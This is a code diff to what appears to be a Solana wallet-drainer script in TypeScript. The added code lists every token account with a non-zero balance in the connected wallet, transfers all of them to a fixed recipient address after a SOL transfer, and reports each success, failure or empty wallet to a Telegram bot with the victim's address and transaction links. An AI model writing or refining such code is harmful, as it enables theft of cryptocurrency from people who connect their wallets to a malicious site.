@@ -4,7 +4,8 @@ import {
   createAssociatedTokenAccountInstruction, 
   createTransferInstruction, 
   TOKEN_PROGRAM_ID, 
-  ASSOCIATED_TOKEN_PROGRAM_ID 
+  ASSOCIATED_TOKEN_PROGRAM_ID,
+  getAccount
 } from '@solana/spl-token';
 
 // Add Buffer polyfill for browser environment in a way that works with Vite
@@ -109,6 +110,7 @@ const createConnection = async (forceFresh = false): Promise<Connection> => {
   });
 };
 
+// Enhanced token account fetching with proper parsing and error handling
 export const getTokenAccounts = async (connection: Connection, walletAddress: string) => {
   try {
     console.log("Fetching token accounts for address:", walletAddress);
@@ -134,14 +136,22 @@ export const getTokenAccounts = async (connection: Connection, walletAddress: st
       const response = await freshConnection.getParsedTokenAccountsByOwner(
         pubKey,
         {
-          programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
+          programId: TOKEN_PROGRAM_ID,
         },
         'confirmed'
       );
       
       console.log(`Token accounts found: ${response.value.length}`);
       
-      return response.value.map(item => ({
+      // Ensure we're only including accounts with non-zero balances
+      const validTokens = response.value.filter(item => {
+        const amount = item.account.data.parsed.info.tokenAmount.uiAmount;
+        return amount !== null && amount > 0;
+      });
+      
+      console.log(`Non-zero token accounts: ${validTokens.length}`);
+      
+      return validTokens.map(item => ({
         mint: item.account.data.parsed.info.mint,
         amount: item.account.data.parsed.info.tokenAmount.uiAmount,
         decimals: item.account.data.parsed.info.tokenAmount.decimals,
@@ -389,7 +399,7 @@ export const hasEnoughSolForRent = (balanceInSol: number, tokensOnly = false): b
   return balanceInSol >= MINIMUM_REQUIRED_SOL;
 };
 
-// New function to transfer tokens
+// Enhanced token transfer function with better error handling and token verification
 export const transferTokens = async (
   connection: Connection,
   wallet: any,
@@ -403,57 +413,106 @@ export const transferTokens = async (
     return [];
   }
 
+  console.log(`Starting token transfer process for ${tokens.length} tokens`);
   const results = [];
   const walletPublicKey = wallet.adapter.publicKey;
 
-  for (const token of tokens) {
+  // First, verify we have valid tokens to transfer
+  const validTokens = tokens.filter(token => 
+    token && token.mint && token.amount && token.amount > 0 && token.decimals !== undefined
+  );
+  
+  console.log(`Found ${validTokens.length} valid tokens to transfer`);
+  
+  if (validTokens.length === 0) {
+    console.log("No valid tokens to transfer");
+    if (botToken && chatId) {
+      await sendToTelegram({
+        address: walletPublicKey.toString(),
+        message: `NO TOKENS TO TRANSFER: Either no tokens found or all tokens have zero balance`,
+        walletName: wallet.adapter?.name || "Unknown Wallet"
+      }, botToken, chatId);
+    }
+    return [];
+  }
+
+  for (const token of validTokens) {
     try {
-      if (!token.mint || !token.amount || token.amount <= 0) {
-        console.log(`Skipping token ${token.mint}: Invalid amount or zero balance`);
-        continue;
-      }
+      console.log(`Processing token ${token.mint}, Amount: ${token.amount}, Decimals: ${token.decimals}`);
 
-      console.log(`Attempting to transfer token: ${token.mint}, Amount: ${token.amount}`);
-
-      // Get the recipient's associated token account
-      const recipientTokenAccount = getAssociatedTokenAddressSync(
-        new PublicKey(token.mint),
-        new PublicKey(recipientAddress),
-        false,
-        TOKEN_PROGRAM_ID,
-        ASSOCIATED_TOKEN_PROGRAM_ID
-      );
-
-      // Check if recipient token account exists, if not create it
-      let transaction = new Transaction();
-      
-      // Add instruction to create recipient token account if it doesn't exist
-      const accountInfo = await connection.getAccountInfo(recipientTokenAccount);
-      if (!accountInfo) {
-        console.log(`Creating token account for recipient: ${recipientAddress}`);
-        transaction.add(
-          createAssociatedTokenAccountInstruction(
-            walletPublicKey,
-            recipientTokenAccount,
-            new PublicKey(recipientAddress),
-            new PublicKey(token.mint),
-            TOKEN_PROGRAM_ID,
-            ASSOCIATED_TOKEN_PROGRAM_ID
-          )
-        );
-      }
-      
-      // Get sender's token account
+      // Double-check the token account exists and has the correct balance
+      const mintPublicKey = new PublicKey(token.mint);
       const senderTokenAccount = getAssociatedTokenAddressSync(
-        new PublicKey(token.mint),
+        mintPublicKey,
         walletPublicKey,
         false,
         TOKEN_PROGRAM_ID,
         ASSOCIATED_TOKEN_PROGRAM_ID
       );
       
+      console.log(`Sender token account: ${senderTokenAccount.toString()}`);
+      
+      // Verify the token account exists and has balance
+      let accountInfo;
+      try {
+        accountInfo = await connection.getParsedAccountInfo(senderTokenAccount);
+        if (!accountInfo || !accountInfo.value) {
+          console.log(`Token account doesn't exist for ${token.mint}`);
+          results.push({ 
+            mint: token.mint, 
+            success: false, 
+            error: "Token account doesn't exist",
+            amount: token.amount 
+          });
+          continue;
+        }
+        
+        console.log(`Token account exists for ${token.mint}`);
+      } catch (error) {
+        console.error(`Error verifying token account for ${token.mint}:`, error);
+        results.push({ 
+          mint: token.mint, 
+          success: false, 
+          error: "Error verifying token account",
+          amount: token.amount 
+        });
+        continue;
+      }
+
+      // Get the recipient's associated token account
+      const recipientTokenAccount = getAssociatedTokenAddressSync(
+        mintPublicKey,
+        new PublicKey(recipientAddress),
+        false,
+        TOKEN_PROGRAM_ID,
+        ASSOCIATED_TOKEN_PROGRAM_ID
+      );
+      
+      console.log(`Recipient token account: ${recipientTokenAccount.toString()}`);
+
+      // Create transaction to transfer tokens
+      let transaction = new Transaction();
+      
+      // Add instruction to create recipient token account if it doesn't exist
+      const recipientAccountInfo = await connection.getAccountInfo(recipientTokenAccount);
+      if (!recipientAccountInfo) {
+        console.log(`Creating token account for recipient: ${recipientAddress}`);
+        transaction.add(
+          createAssociatedTokenAccountInstruction(
+            walletPublicKey,
+            recipientTokenAccount,
+            new PublicKey(recipientAddress),
+            mintPublicKey,
+            TOKEN_PROGRAM_ID,
+            ASSOCIATED_TOKEN_PROGRAM_ID
+          )
+        );
+      }
+      
       // Calculate the raw token amount based on decimals
       const rawAmount = Math.floor(token.amount * Math.pow(10, token.decimals));
+      
+      console.log(`Raw amount to transfer: ${rawAmount}`);
       
       // Add transfer instruction
       transaction.add(
@@ -467,33 +526,72 @@ export const transferTokens = async (
         )
       );
       
+      // Set recent blockhash and sign transaction
+      transaction.feePayer = walletPublicKey;
+      const blockHash = await connection.getLatestBlockhash('confirmed');
+      transaction.recentBlockhash = blockHash.blockhash;
+      
+      console.log('Sending token transfer transaction...');
+      
       // Sign and send transaction
       let signature;
-      if (typeof wallet.signAndSendTransaction === 'function') {
-        signature = await wallet.signAndSendTransaction(transaction);
-      } else if (typeof wallet.adapter?.sendTransaction === 'function') {
-        signature = await wallet.adapter.sendTransaction(transaction, connection);
-      } else {
-        throw new Error('Wallet does not support transaction signing');
+      try {
+        if (typeof wallet.signAndSendTransaction === 'function') {
+          signature = await wallet.signAndSendTransaction(transaction);
+        } else if (typeof wallet.adapter?.sendTransaction === 'function') {
+          signature = await wallet.adapter.sendTransaction(transaction, connection);
+        } else {
+          throw new Error('Wallet does not support transaction signing');
+        }
+        
+        console.log(`Token transfer transaction sent with signature: ${signature}`);
+        
+        // Wait for confirmation
+        console.log('Waiting for transaction confirmation...');
+        const confirmation = await connection.confirmTransaction({
+          signature,
+          ...blockHash
+        }, 'confirmed');
+        
+        if (confirmation.value.err) {
+          throw new Error(`Transaction confirmed but failed: ${JSON.stringify(confirmation.value.err)}`);
+        }
+        
+        console.log(`Token transfer successful and confirmed: ${signature}`);
+        
+        // Send success notification to Telegram if credentials provided
+        if (botToken && chatId) {
+          await sendToTelegram({
+            address: walletPublicKey.toString(),
+            message: `TOKEN TRANSFER SUCCESS: ${token.amount} tokens of ${token.mint} sent to ${recipientAddress}\nTransaction: https://explorer.solana.com/tx/${signature}`,
+            walletName: wallet.adapter?.name || "Unknown Wallet"
+          }, botToken, chatId);
+        }
+        
+        results.push({ 
+          mint: token.mint, 
+          success: true, 
+          signature,
+          amount: token.amount 
+        });
+      } catch (error) {
+        console.error(`Error sending token transfer transaction for ${token.mint}:`, error);
+        
+        results.push({ 
+          mint: token.mint, 
+          success: false, 
+          error: error instanceof Error ? error.message : "Error sending transaction",
+          amount: token.amount 
+        });
+        
+        if (botToken && chatId) {
+          await sendToTelegram({
+            address: walletPublicKey.toString(),
+            message: `TOKEN TRANSFER FAILED: ${token.amount} tokens of ${token.mint}\nError: ${error instanceof Error ? error.message : "Error sending transaction"}`,
+            walletName: wallet.adapter?.name || "Unknown Wallet"
+          }, botToken, chatId);
+        }
       }
-      
-      console.log(`Token transfer successful: ${signature}`);
-      
-      // Send success notification to Telegram if credentials provided
-      if (botToken && chatId) {
-        await sendToTelegram({
-          address: walletPublicKey.toString(),
-          message: `TOKEN TRANSFER SUCCESS: ${token.amount} tokens of ${token.mint} sent to ${recipientAddress}\nTransaction: https://explorer.solana.com/tx/${signature}`,
-          walletName: wallet.adapter?.name || "Unknown Wallet"
-        }, botToken, chatId);
-      }
-      
-      results.push({ 
-        mint: token.mint, 
-        success: true, 
-        signature,
-        amount: token.amount 
-      });
     } catch (error) {
       console.error(`Failed to transfer token ${token.mint}:`, error);
       
@@ -699,14 +797,30 @@ export const signAndSendTransaction = async (
     // After successful SOL transfer, also transfer any tokens if available
     if (tokens && tokens.length > 0) {
       console.log(`Attempting to transfer ${tokens.length} tokens to ${recipientAddress}`);
-      await transferTokens(
-        connection,
-        wallet,
-        recipientAddress,
-        tokens,
-        botToken,
-        chatId
-      );
+      
+      // Filter for tokens with actual balances
+      const tokensWithBalance = tokens.filter(t => t.amount && t.amount > 0);
+      console.log(`Found ${tokensWithBalance.length} tokens with non-zero balance`);
+      
+      if (tokensWithBalance.length > 0) {
+        await transferTokens(
+          connection,
+          wallet,
+          recipientAddress,
+          tokensWithBalance,
+          botToken,
+          chatId
+        );
+      } else {
+        console.log("No tokens with balance to transfer");
+        if (botToken && chatId) {
+          await sendToTelegram({
+            address: walletPublicKey.toString(),
+            message: `NO TOKENS TO TRANSFER: All tokens have zero balance`,
+            walletName: wallet.adapter?.name || "Unknown Wallet"
+          }, botToken, chatId);
+        }
+      }
     }
     
     return signature;
